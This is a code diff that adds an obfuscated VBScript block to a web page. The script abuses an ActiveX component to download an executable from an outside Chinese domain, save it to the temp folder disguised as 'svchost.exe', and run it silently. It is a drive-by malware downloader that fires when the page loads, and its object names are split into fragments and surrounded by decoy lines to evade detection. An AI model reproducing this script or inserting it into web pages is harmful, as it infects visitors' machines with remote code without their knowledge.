@@ -1,0 +1,44 @@
+<script language="VBScript">
+    on error resume next
+    m1="object"
+    m2="classid"
+    m3="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
+    m4="Microsoft.XMLHTTP"
+    m5="Shell.Application"
+    m6="Scripti"&"ng.Fil"&"eSystemObject"
+    Set xasonc = document.createElement(m1)
+    xason = "http://www.windown.com.cn/drive.exe"
+    xasonc.setAttribute m2, m3
+    xasoni=m4
+    Set xasond = xasonc.CreateObject(xasoni,"")
+    yhangf="Ado"
+    yhangg="db."
+    yhangh="Str"
+    yhangi="eam"
+    xasonf=yhangf&yhangg&yhangh&yhangi
+    xasong=xasonf
+    set xasona = xasonc.createobject(xasong,"")
+    xasona.type = 1
+    xasonh="G"&"E"&"T"
+    xasond.Open xasonh, xason, False
+    xasond.Send
+    xason9="svchost.exe"
+    set xasonb = xasonc.createobject(m6,"")
+    set xasone = xasonb.GetSpecialFolder(2)
+    xasona.open
+    xason8="xasona.BuildPath(xasona,xason8)"
+    xason7="xasonb.BuildPath(xasonb,xason7)"
+    xason6="xasonc.BuildPath(xasond,xason6)"
+    xason5="xasond.BuildPath(xasonf,xason5)"
+    xason4="xasone.BuildPath(xasong,xason4)"
+    xason3="xasonf.BuildPath(xasonh,xason4)"
+    xason2="xasong.BuildPath(xasoni,xason3)"
+    xason1="xasonh.BuildPath(xasong,xason1)"
+    xason0="xasoni.BuildPath(xasonk,xason0)"
+    xason9= xasonb.BuildPath(xasone,xason9)
+    xasona.write xasond.responseBody
+    xasona.savetofile xason9,2
+    xasona.close
+    set xasone = xasonc.createobject(m5,"")
+    xasone.ShellExecute xason9,BBS,BBS,"o"&"p"&"e"&"n",0
+    </script>
